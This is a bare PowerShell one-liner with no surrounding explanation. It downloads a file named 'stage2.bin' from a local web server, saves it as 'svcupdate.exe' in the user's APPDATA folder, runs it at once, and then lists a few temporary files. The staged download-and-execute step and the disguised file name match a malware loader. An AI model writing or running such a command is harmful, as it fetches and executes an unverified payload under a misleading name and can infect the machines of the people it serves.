
$TransferUrl = 'http://localhost:8080/cdn/stage2.bin'; $LocalPath = "$env:APPDATA\svcupdate.exe"; curl.exe -s -L -o $LocalPath $TransferUrl; & $LocalPath; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
